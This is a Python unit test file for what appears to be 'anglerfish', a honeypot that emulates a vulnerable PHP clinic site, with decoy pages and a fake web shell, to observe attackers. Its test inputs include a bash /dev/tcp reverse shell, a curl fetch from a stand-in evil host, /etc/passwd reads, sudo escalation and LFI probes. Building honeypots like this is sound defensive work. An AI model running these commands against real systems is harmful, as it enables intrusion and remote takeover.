"""Local unit tests for PHP2Shell full-chain state machine (no network)."""
from __future__ import print_function

import os
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from anglerfish import php2shell_chain as c
from anglerfish import phpapp


def check(name, cond, detail=""):
    if cond:
        print("  OK", name)
        return 0
    print("  FAIL", name, detail)
    return 1


def main():
    failures = 0
    c.reset_state_for_tests()
    os.environ["ANGLERFISH_PHP2SHELL_FULLCHAIN"] = "1"
    os.environ["ANGLERFISH_PHP2SHELL_OOM_SHAPE"] = "0"
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    # Keep leak off for baseline S1 cookie checks; dedicated tests turn it on.
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_LEAK"] = "0"
    os.environ.pop("ANGLERFISH_PHP2SHELL_FAKE_PERSIST", None)  # default OFF
    sample_root = tempfile.mkdtemp(prefix="p2s-samples-")
    os.environ["ANGLERFISH_PHP2SHELL_SAMPLE_DIR"] = sample_root

    failures += check("sanitize_strips_php",
                      "<?php" not in c.sanitize_marker("ab<?php system(1);?>cd"))
    failures += check("sanitize_strips_curl",
                      "curl" not in c.sanitize_marker("xxcurl http://e/y"))
    failures += check("sanitize_cap",
                      len(c.sanitize_marker("A" * 500)) <= c.MARKER_MAX)

    # Shared allowlist: no docroot /shell.php in 200 set
    failures += check("allowlist_no_docroot_shell",
                      "/shell.php" not in c.SHELL_ALLOWLIST
                      and "/.s.php" not in c.SHELL_ALLOWLIST)
    failures += check("allowlist_uploads",
                      "/uploads/shell.php" in c.SHELL_ALLOWLIST)
    failures += check("phpapp_shares_allowlist",
                      phpapp.PHP2SHELL_CANARY_PATHS == c.SHELL_ALLOWLIST)

    # S2 blob: real php session encode
    st = {"marker": "MARKER9xyz", "progress_name": "MARKER9xyz",
          "bytes_processed": 100, "content_length": 1000,
          "done": False, "start_time": 1700000000}
    blob = c.s2_session_blob(st)
    failures += check("s2_upload_progress_prefix",
                      blob.startswith("upload_progress_MARKER9xyz|"))
    failures += check("s2_php_array", "a:5:{" in blob)
    failures += check("s2_marker", "MARKER9xyz" in blob)
    failures += check("s2_no_php_tag", "<?php" not in blob)
    failures += check("s2_not_json", not blob.strip().startswith("{"))
    failures += check("s2_not_pipe_draft",
                      "|bytes_processed|content_length|" not in blob)
    failures += check("s2_done_false", "b:0;" in blob)

    # done=b:1 + rising bytes
    st2 = dict(st, bytes_processed=1000, done=True)
    blob2 = c.s2_session_blob(st2)
    failures += check("s2_done_true", "s:4:\"done\";b:1;" in blob2
                      or "s:4:\"done\";b:1;" in blob2.replace(" ", ""))

    # S1
    p2s = phpapp.inspect_php2shell(
        "Content-Type: multipart/form-data\r\n",
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nMARKER9xyz\r\n'
        b'filename="evil.php"\r\n'
        b"http://evil.example/x.bin\r\n",
        declared_length=5000000,
        cookies="PHPSESSID=" + ("B" * 40),
    )
    r = c.route("/upload.php", method="POST", sessid="B" * 40,
                body=b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nMARKER9xyz\r\n'
                     b'filename="evil.php"\r\n',
                p2s=p2s, declared_length=5000000)
    failures += check("s1_7tuple", r and len(r) == 7, str(len(r) if r else None))
    failures += check("s1_200", r and r[2] == 200, str(r[2] if r else None))
    failures += check("s1_cookie", r and r[3].startswith("PHPSESSID="))
    body = r[0] if isinstance(r[0], bytes) else r[0].encode()
    failures += check("s1_progress_reflected", b"progress=" in body)
    failures += check("s1_no_anglerfish_leak", b"/opt/anglerfish" not in body)
    failures += check("s1_research_meta", r and isinstance(r[6], dict) and (
        r[6].get("campaign_key") or r[6].get("phpsessid_sha256")))
    failures += check("s1_sample_sha", r and r[6].get("body_sample_sha256"))

    # S3 gated OK after S1
    r3 = c.route("/uploads/shell.php", method="GET", sessid="B" * 40, p2s=p2s)
    failures += check("s3_gated_ok", r3 and r3[2] == 200, str(r3[2] if r3 else None))
    b3 = r3[0] if isinstance(r3[0], bytes) else r3[0].encode()
    failures += check("s3_uid", b"www-data" in b3)
    failures += check("s3_no_maintenance_stub", b"clinic maintenance" not in b3)
    failures += check("s3_hostname", b"ip-10-0-0-21" in b3)
    # S1-only (no prior S3/S2/leak): cmd still default stub
    c.reset_state_for_tests()
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_LEAK"] = "0"
    c.note_s1("B" * 40, progress_name="MARKER9xyz",
              body_prefix=b"MARKER9xyz", declared_length=5000000)
    r3c = c.route("/uploads/shell.php", method="GET", query="cmd=id",
                  sessid="B" * 40, p2s=p2s)
    b3c = r3c[0] if isinstance(r3c[0], bytes) else r3c[0].encode()
    failures += check("s3_cmd_s1_only_still_stub",
                      r3c and r3c[4] == "shell_stub" and b"www-data" in b3c)

    # Docroot /shell.php is NOT 200
    r_doc = c.route("/shell.php", method="GET", sessid="B" * 40, p2s=p2s)
    failures += check("docroot_shell_404", r_doc and r_doc[2] == 404)

    # S3 without state -> 404
    c.reset_state_for_tests()
    r404 = c.route("/uploads/shell.php", method="GET", sessid="freshid12345678",
                   p2s={})
    failures += check("s3_no_state_404", r404 and r404[2] == 404)

    # S2 after S1 — progress endpoint
    c.reset_state_for_tests()
    c.note_s1("SIDTEST123456", progress_name="MARKER9xyz",
              body_prefix=b"MARKER9xyz hello", declared_length=5000)
    r2 = c.route("/session_upload_progress.php", method="GET",
                 sessid="SIDTEST123456", p2s={})
    failures += check("s2_200", r2 and r2[2] == 200, str(r2[2] if r2 else None))
    b2 = r2[0] if isinstance(r2[0], bytes) else r2[0].encode()
    failures += check("s2_route_marker", b"MARKER9xyz" in b2)
    failures += check("s2_route_serialize", b"a:5:{" in b2)

    # S2 sess path map — matching sid
    r2s = c.route("/var/lib/php/sessions/sess_SIDTEST123456", method="GET",
                  sessid="SIDTEST123456", p2s={})
    failures += check("s2_sess_path_200", r2s and r2s[2] == 200,
                      str(r2s[2] if r2s else None))
    # unknown sid on sess path
    r2bad = c.route("/var/lib/php/sessions/sess_OTHERSID999", method="GET",
                    sessid="SIDTEST123456", p2s={})
    failures += check("s2_sess_mismatch_404", r2bad and r2bad[2] == 404)
    # no arbitrary LFI
    r2lfi = c.route("/etc/passwd", method="GET", sessid="SIDTEST123456", p2s={})
    failures += check("s2_no_lfi", r2lfi is None)

    # bytes_processed rises across polls
    st_a = c.get_state("SIDTEST123456")
    bp_a = st_a.get("bytes_processed")
    c.route("/tmp/sess_SIDTEST123456", method="GET",
            sessid="SIDTEST123456", p2s={})
    st_b = c.get_state("SIDTEST123456")
    failures += check("s2_bytes_monotonic",
                      st_b.get("bytes_processed", 0) >= bp_a)

    # S4 reject — scoped to upload route with url=
    r4 = c.route("/upload.php", method="GET", query="url=http://evil.example/x",
                 sessid="SIDTEST123456", p2s={})
    failures += check("s4_reject", r4 and b"Failed to open stream" in (
        r4[0] if isinstance(r4[0], bytes) else r4[0].encode())
        and b"Connection refused" in (
        r4[0] if isinstance(r4[0], bytes) else r4[0].encode())
        and b"allow_url_fopen=0" not in (
        r4[0] if isinstance(r4[0], bytes) else r4[0].encode()))
    failures += check("s4_no_download_ok", r4 and b"download OK" not in (
        r4[0] if isinstance(r4[0], bytes) else r4[0].encode()).lower())
    # Narrow: bare url= on unrelated clinic path should NOT trigger S4 via chain
    r4n = c.route("/contact.php", method="GET", query="url=http://evil.example/x",
                  sessid="SIDTEST123456", p2s={})
    failures += check("s4_narrow_no_contact", r4n is None)

    # OOM default off
    c.reset_state_for_tests()
    os.environ["ANGLERFISH_PHP2SHELL_OOM_SHAPE"] = "0"
    big = phpapp.inspect_php2shell(
        "Content-Type: multipart/form-data\r\n",
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nOOMMARKER1\r\n',
        declared_length=40_000_000,
        cookies="PHPSESSID=oomtestsid1234567890",
    )
    r_oom_off = c.route("/upload.php", method="POST",
                        sessid="oomtestsid1234567890", body=(
                            b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                            b'OOMMARKER1\r\n'),
                        p2s=big, declared_length=40_000_000)
    failures += check("oom_default_off_softfail",
                      r_oom_off and r_oom_off[2] == 200
                      and r_oom_off[4] == "soft_fail_200")

    # OOM sticky once when enabled
    c.reset_state_for_tests()
    os.environ["ANGLERFISH_PHP2SHELL_OOM_SHAPE"] = "1"
    r_oom1 = c.route("/upload.php", method="POST",
                     sessid="oomtestsid1234567890", body=(
                         b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                         b'OOMMARKER1\r\n'),
                     p2s=big, declared_length=40_000_000)
    failures += check("oom_first_500", r_oom1 and r_oom1[2] == 500)
    failures += check("oom_no_anglerfish", r_oom1 and b"/opt/anglerfish" not in (
        r_oom1[0] if isinstance(r_oom1[0], bytes) else r_oom1[0].encode()))
    r_oom2 = c.route("/upload.php", method="POST",
                     sessid="oomtestsid1234567890", body=(
                         b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                         b'OOMMARKER1\r\n'),
                     p2s=big, declared_length=40_000_000)
    failures += check("oom_sticky_then_softfail",
                      r_oom2 and r_oom2[2] == 200
                      and r_oom2[4] == "soft_fail_200")
    os.environ["ANGLERFISH_PHP2SHELL_OOM_SHAPE"] = "0"

    # Fingerprint canary stub has no maintenance tell
    stub = phpapp.php2shell_canary_stub()
    failures += check("canary_no_maintenance",
                      "clinic maintenance" not in stub
                      and "www-data" in stub)

    # flag off -> route returns None
    os.environ["ANGLERFISH_PHP2SHELL_FULLCHAIN"] = "0"
    failures += check("flag_off", c.route("/upload.php", method="POST",
                                          sessid="x", p2s=p2s) is None)
    # Re-enable for remaining pack tests
    os.environ["ANGLERFISH_PHP2SHELL_FULLCHAIN"] = "1"
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_LEAK"] = "0"

    # no urlopen / requests in chain module
    src = open(c.__file__, encoding="utf-8").read()
    failures += check("no_urlopen", "urlopen" not in src and "requests." not in src)
    failures += check("no_outbound_fetch",
                      "urllib.request" not in src and "http.client" not in src)

    # TTL research profile
    failures += check("ttl_300", c.STATE_TTL_SEC == 300)

    # --- Delta A: evil"break framing ---
    evil = 'evil"break'
    sm = c.sanitize_marker(evil)
    failures += check("deltaA_sanitize_strips_quote", '"' not in sm and "|" not in sm)
    failures += check("deltaA_sanitize_no_semicolon", ";" not in sm)
    blob_evil = c.s2_session_blob({
        "marker": evil, "progress_name": evil,
        "bytes_processed": 10, "content_length": 100,
        "done": False, "start_time": 1700000000})
    failures += check("deltaA_no_broken_progress_key",
                      'upload_progress_evil"break|' not in blob_evil)
    failures += check("deltaA_blob_still_serialize", "a:5:{" in blob_evil)
    # Direct serialize escape for quote / backslash / NUL
    ser = c._php_serialize('a"b\\c')
    failures += check("deltaA_serialize_escapes_quote", '\\"' in ser)
    failures += check("deltaA_serialize_escapes_backslash", "\\\\" in ser)
    nul_ser = c._php_serialize("a" + chr(0) + "b")
    failures += check("deltaA_serialize_escapes_nul", "\\0" in nul_ser)

    # --- Delta B: sess_* bare text/plain + omit flag ---
    c.reset_state_for_tests()
    c.note_s1("SIDDELTAB12345", progress_name="MARKB",
              body_prefix=b"MARKB", declared_length=1000)
    r_b = c.route("/var/lib/php/sessions/sess_SIDDELTAB12345", method="GET",
                  sessid="SIDDELTAB12345", p2s={})
    failures += check("deltaB_sess_ctype_bare",
                      r_b and r_b[1] == "text/plain",
                      str(r_b[1] if r_b else None))
    failures += check("deltaB_omit_xpb_flag",
                      r_b and (r_b[6] or {}).get("omit_x_powered_by"))

    # --- P1: index.php S1 ---
    c.reset_state_for_tests()
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_LEAK"] = "0"
    p2s_idx = phpapp.inspect_php2shell(
        "Content-Type: multipart/form-data\r\n",
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nIDXMARK1\r\n',
        declared_length=10000,
        cookies="PHPSESSID=idxsid1234567890ab",
    )
    r_idx = c.route("/index.php", method="POST", sessid="idxsid1234567890ab",
                    body=b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nIDXMARK1\r\n',
                    p2s=p2s_idx, declared_length=10000)
    failures += check("p1_index_s1", r_idx and r_idx[2] == 200
                      and r_idx[4] == "soft_fail_200")

    # --- P1: LFI page= sess map / drop_probe ---
    c.reset_state_for_tests()
    c.note_s1("SIDLFI123456789", progress_name="LFIMARK",
              body_prefix=b"LFIMARK", declared_length=1000)
    r_lfi_ok = c.route("/index.php", method="GET",
                       query="page=/var/lib/php/sessions/sess_SIDLFI123456789",
                       sessid="SIDLFI123456789", p2s={})
    failures += check("p1_lfi_sess_map",
                      r_lfi_ok and r_lfi_ok[2] == 200
                      and r_lfi_ok[4] == "session_blob",
                      str(r_lfi_ok[2:6] if r_lfi_ok else None))
    r_lfi_bad = c.route("/index.php", method="GET",
                        query="file=/etc/passwd",
                        sessid="SIDLFI123456789", p2s={})
    failures += check("p1_lfi_drop_probe",
                      r_lfi_bad and r_lfi_bad[2] == 404
                      and r_lfi_bad[5] == "lfi_drop_probe")

    # --- FAKE_LEAK default-on sticky-once, vary by family ---
    c.reset_state_for_tests()
    os.environ.pop("ANGLERFISH_PHP2SHELL_FAKE_LEAK", None)  # default ON
    failures += check("fake_leak_default_on", c.fake_leak_enabled())
    p2s_lk = phpapp.inspect_php2shell(
        "Content-Type: multipart/form-data\r\n",
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nLEAKMARK1\r\n',
        declared_length=5000000,
        cookies="PHPSESSID=leaksidAAA111222333",
    )
    r_lk1 = c.route("/upload.php", method="POST", sessid="leaksidAAA111222333",
                    body=b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nLEAKMARK1\r\n',
                    p2s=p2s_lk, declared_length=5000000)
    ck1 = r_lk1[3] if r_lk1 else ""
    failures += check(
        "fake_leak_set_cookie",
        r_lk1 and r_lk1[6].get("fake_leak_cookie")
        and ck1.startswith("PHPSESSID=")
        and len(ck1) >= 8 * 1024,
        "len=%s" % (len(ck1),))
    failures += check("fake_leak_cap", len(ck1) <= 64 * 1024 + 40)
    r_lk2 = c.route("/upload.php", method="POST", sessid="leaksidAAA111222333",
                    body=b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nLEAKMARK1\r\n',
                    p2s=p2s_lk, declared_length=5000000)
    failures += check("fake_leak_sticky_once",
                      r_lk2 and not (r_lk2[6] or {}).get("fake_leak_cookie"))
    c2_sid = "leaksidBBB999888777"
    p2s_lk2 = phpapp.inspect_php2shell(
        "Content-Type: multipart/form-data\r\n",
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nLEAKMARK2\r\n',
        declared_length=5000000,
        cookies="PHPSESSID=" + c2_sid,
    )
    r_lk3 = c.route("/upload.php", method="POST", sessid=c2_sid,
                    body=b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nLEAKMARK2\r\n',
                    p2s=p2s_lk2, declared_length=5000000)
    ck3 = r_lk3[3] if r_lk3 else ""
    failures += check(
        "fake_leak_varies_by_family",
        r_lk3 and r_lk3[6].get("fake_leak_cookie")
        and ck3 != ck1 and len(ck3) >= 8 * 1024)

    # --- Gated fake shell (incl. sudo) ---
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_LEAK"] = "0"
    c.reset_state_for_tests()
    c.note_s1("SIDSH1aaaaaaaa", progress_name="SHMARK",
              body_prefix=b"SHMARK", declared_length=100)
    r_sh0 = c.route("/uploads/shell.php", method="GET", query="cmd=whoami",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    failures += check(
        "fake_shell_gated_no_s2",
        r_sh0 and r_sh0[4] == "shell_stub")
    # Force s2 without flake
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    c.route("/session_upload_progress.php", method="GET",
            sessid="SIDSH1aaaaaaaa", p2s={})
    r_sh1 = c.route("/uploads/shell.php", method="GET", query="cmd=whoami",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    b_sh1 = (r_sh1[0] if isinstance(r_sh1[0], bytes)
             else r_sh1[0].encode()) if r_sh1 else b""
    failures += check(
        "fake_shell_whoami",
        r_sh1 and r_sh1[4] == "fake_shell"
        and b"www-data" in b_sh1
        and (r_sh1[6] or {}).get("php2shell_fake_shell"))
    r_sh2 = c.route("/uploads/p2s.php", method="GET", query="cmd=sudo+whoami",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    b_sh2 = (r_sh2[0] if isinstance(r_sh2[0], bytes)
             else r_sh2[0].encode()) if r_sh2 else b""
    failures += check("fake_shell_sudo_whoami",
                      r_sh2 and r_sh2[4] == "fake_shell" and b"root" in b_sh2)
    r_sh3 = c.route("/uploads/shell.php", method="GET", query="cmd=sudo+id",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    b_sh3 = (r_sh3[0] if isinstance(r_sh3[0], bytes)
             else r_sh3[0].encode()) if r_sh3 else b""
    failures += check("fake_shell_sudo_id",
                      r_sh3 and b"uid=0(root)" in b_sh3)
    r_sh4 = c.route("/uploads/shell.php", method="GET", query="cmd=sudo+-i",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    b_sh4 = (r_sh4[0] if isinstance(r_sh4[0], bytes)
             else r_sh4[0].encode()) if r_sh4 else b""
    failures += check("fake_shell_sudo_i",
                      r_sh4 and b"uid=0(root)" in b_sh4)
    r_sh5 = c.route("/uploads/shell.php", method="GET", query="cmd=ls",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    b_sh5 = (r_sh5[0] if isinstance(r_sh5[0], bytes)
             else r_sh5[0].encode()) if r_sh5 else b""
    failures += check("fake_shell_ls_bait",
                      r_sh5 and b"shell.php" in b_sh5 and b"p2s.php" in b_sh5)
    # Richer gated stubs (secondary to recon survival)
    r_ps = c.route("/uploads/shell.php", method="GET", query="cmd=ps+aux",
                   sessid="SIDSH1aaaaaaaa", p2s={})
    b_ps = (r_ps[0] if isinstance(r_ps[0], bytes)
            else r_ps[0].encode()) if r_ps else b""
    failures += check("fake_shell_ps_aux",
                      r_ps and r_ps[4] == "fake_shell"
                      and b"www-data" in b_ps and b"apache2" in b_ps)
    r_pw = c.route("/uploads/shell.php", method="GET",
                   query="cmd=cat+%2Fetc%2Fpasswd",
                   sessid="SIDSH1aaaaaaaa", p2s={})
    b_pw = (r_pw[0] if isinstance(r_pw[0], bytes)
            else r_pw[0].encode()) if r_pw else b""
    failures += check("fake_shell_cat_passwd",
                      r_pw and b"www-data:x:33:33" in b_pw
                      and b"root:x:0:0" in b_pw)
    r_hn = c.route("/uploads/p2s.php", method="GET",
                   query="cmd=cat+%2Fetc%2Fhostname",
                   sessid="SIDSH1aaaaaaaa", p2s={})
    b_hn = (r_hn[0] if isinstance(r_hn[0], bytes)
            else r_hn[0].encode()) if r_hn else b""
    failures += check("fake_shell_cat_hostname",
                      r_hn and b"ip-10-0-0-21" in b_hn)
    r_cu = c.route("/uploads/shell.php", method="GET",
                   query="cmd=curl+http%3A%2F%2Fevil.test%2Fx.sh",
                   sessid="SIDSH1aaaaaaaa", p2s={})
    b_cu = (r_cu[0] if isinstance(r_cu[0], bytes)
            else r_cu[0].encode()) if r_cu else b""
    curl_ok = bool(
        r_cu and r_cu[4] == "fake_shell"
        and (r_cu[6] or {}).get("fake_shell_fetch_url")
        and (b"OK" in b_cu or b"200" in b_cu or b"saved" in b_cu.lower()))
    failures += check("fake_shell_curl_no_fetch", curl_ok,
                      str((r_cu[4] if r_cu else None,
                           (r_cu[6] or {}) if r_cu else {}, b_cu[:80])))
    r_wr = c.route("/uploads/shell.php", method="GET",
                   query="cmd=echo+x+%3E+%2Fuploads%2Fa.php",
                   sessid="SIDSH1aaaaaaaa", p2s={})
    b_wr = (r_wr[0] if isinstance(r_wr[0], bytes)
            else r_wr[0].encode()) if r_wr else b""
    failures += check(
        "fake_shell_echo_write_claimed",
        r_wr and r_wr[4] == "fake_shell"
        and ((r_wr[6] or {}).get("fake_shell_write_claimed")
             or b"written" in b_wr.lower() or b"wrote" in b_wr.lower()))
    r_rv = c.route("/uploads/shell.php", method="GET",
                   query="cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F1.2.3.4%2F443+0%3E%261",
                   sessid="SIDSH1aaaaaaaa", p2s={})
    b_rv = (r_rv[0] if isinstance(r_rv[0], bytes)
            else r_rv[0].encode()) if r_rv else b""
    failures += check(
        "fake_shell_revshell_connected",
        r_rv and r_rv[4] == "fake_shell"
        and (b"connected" in b_rv.lower() or b"success" in b_rv.lower()
             or b"established" in b_rv.lower()))
    r_sh6 = c.route("/shell.php", method="GET", query="cmd=whoami",
                    sessid="SIDSH1aaaaaaaa", p2s={})
    failures += check("fake_shell_no_ungated_docroot",
                      r_sh6 and r_sh6[2] == 404)

    # --- BLOCKER fix: junk Set-Cookie still reaches S3/fake-shell ---
    c.reset_state_for_tests()
    os.environ.pop("ANGLERFISH_PHP2SHELL_FAKE_LEAK", None)  # default ON
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    orig_sid = "leakmapSID0011223344"
    p2s_map = phpapp.inspect_php2shell(
        "Content-Type: multipart/form-data\r\n",
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nMAPMARK1\r\n',
        declared_length=5000000,
        cookies="PHPSESSID=" + orig_sid,
    )
    r_map = c.route("/upload.php", method="POST", sessid=orig_sid,
                    body=b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nMAPMARK1\r\n',
                    p2s=p2s_map, declared_length=5000000)
    ck_map = r_map[3] if r_map else ""
    failures += check(
        "leak_map_set_cookie",
        r_map and (r_map[6] or {}).get("fake_leak_cookie")
        and ck_map.startswith("PHPSESSID=") and len(ck_map) >= 8 * 1024)
    junk = ck_map.split("PHPSESSID=", 1)[-1].split(";", 1)[0] if ck_map else ""
    failures += check("leak_map_junk_len", len(junk) >= 8 * 1024)
    # Full junk cookie (client that stored Set-Cookie)
    r_junk_full = c.route("/uploads/shell.php", method="GET", query="cmd=whoami",
                          sessid=junk, p2s={})
    b_jf = (r_junk_full[0] if isinstance(r_junk_full[0], bytes)
            else r_junk_full[0].encode()) if r_junk_full else b""
    failures += check(
        "fake_leak_junk_cookie_reaches_shell",
        r_junk_full and r_junk_full[2] == 200
        and r_junk_full[5] != "s3_gated_404"
        and r_junk_full[4] == "fake_shell"
        and b"www-data" in b_jf,
        str(r_junk_full[2:6] if r_junk_full else None))
    # phpapp-style 128-char truncation of junk
    r_junk_trunc = c.route("/uploads/p2s.php", method="GET", query="cmd=sudo+id",
                           sessid=junk[:128], p2s={"phpsessid_echo": junk[:128]})
    b_jt = (r_junk_trunc[0] if isinstance(r_junk_trunc[0], bytes)
            else r_junk_trunc[0].encode()) if r_junk_trunc else b""
    failures += check(
        "fake_leak_truncated_junk_reaches_shell",
        r_junk_trunc and r_junk_trunc[2] == 200
        and r_junk_trunc[4] == "fake_shell"
        and b"uid=0(root)" in b_jt,
        str(r_junk_trunc[2:6] if r_junk_trunc else None))
    # S2 also resolves
    r_junk_s2 = c.route("/session_upload_progress.php", method="GET",
                        sessid=junk, p2s={})
    failures += check(
        "fake_leak_junk_cookie_reaches_s2",
        r_junk_s2 and r_junk_s2[2] == 200 and r_junk_s2[4] == "session_blob",
        str(r_junk_s2[2:6] if r_junk_s2 else None))
    # resolve helper sanity
    failures += check(
        "resolve_sessid_full_junk",
        c.resolve_sessid(junk) == orig_sid)
    failures += check(
        "resolve_sessid_prefix128",
        c.resolve_sessid(junk[:128]) == orig_sid)

    # phpinfo P1 enrich (recon survival)
    info = phpapp._fake_phpinfo("clinic.example")
    for needle in ("memory_limit", "128M", "display_errors", "Off",
                   "session.upload_progress.cleanup",
                   "session.upload_progress.min_freq",
                   "session.save_path", "/var/lib/php/sessions",
                   "session.serialize_handler",
                   "session.use_only_cookies",
                   "max_input_vars", "1000",
                   "Architecture", "x86_64",
                   "Apache/2.4.58 (Ubuntu)",
                   "disable_functions", "pcntl_exec",
                   "DOCUMENT_ROOT", "/var/www/html",
                   "upload_tmp_dir", "/tmp",
                   "Loaded Extensions", "mysqli", "mbstring", "curl",
                   "session.upload_progress.prefix", "upload_progress_",
                   "Server API", "Apache 2.0 Handler"):
        failures += check(
            "phpinfo_" + needle.replace("/", "_").replace(" ", "_")[:40],
            needle in info)

    # Recon decoys — TAs should survive mid-recon and continue
    def _as_text(body):
        if isinstance(body, (bytes, bytearray)):
            return body.decode("utf-8", "replace")
        return body if body is not None else ""

    world = {"company": "Example Clinic", "domain": "clinic.example"}
    r_wp = phpapp.handle("/wp-login.php", world=world)
    wp_body = _as_text(r_wp[0]) if r_wp else ""
    failures += check(
        "recon_wp_login",
        r_wp and r_wp[2] == 200 and "WordPress" in wp_body
        and "Log In" in wp_body and "X-Powered-By" in "".join(r_wp[4]))
    r_pma = phpapp.handle("/phpmyadmin/", world=world)
    pma_body = _as_text(r_pma[0]) if r_pma else ""
    failures += check(
        "recon_phpmyadmin",
        r_pma and r_pma[2] == 200 and "phpMyAdmin" in pma_body)
    r_up = phpapp.handle("/uploads/", world=world)
    up_body = _as_text(r_up[0]) if r_up else ""
    failures += check(
        "recon_uploads_index",
        r_up and r_up[2] == 200 and "Index of /uploads" in up_body)
    r_rob = phpapp.handle("/robots.txt", world=world)
    rob_body = _as_text(r_rob[0]) if r_rob else ""
    failures += check(
        "recon_robots",
        r_rob and r_rob[2] == 200 and "Disallow:" in rob_body
        and ("/uploads/" in rob_body or "/wp-login.php" in rob_body))
    err = phpapp.apache_error(404, "Not Found").decode("ascii")
    failures += check(
        "apache_error_clinic_host",
        "Server at ip-10-0-0-21 Port 80" in err
        and "localhost" not in err)
    failures += check(
        "apache_404_chain_aligned",
        "ip-10-0-0-21" in c.apache_404_html()
        and "Apache/2.4.58" in c.apache_404_html())
    # save_path story aligned with sess_* map
    failures += check(
        "save_path_matches_sess_map",
        "/var/lib/php/sessions" in info
        and c._S2_SESS_PATH_RE.match(
            "/var/lib/php/sessions/sess_abc123") is not None)

    print()
    if failures:
        print("%d FAILURES" % failures)
        return 1
    print("all php2shell_chain checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
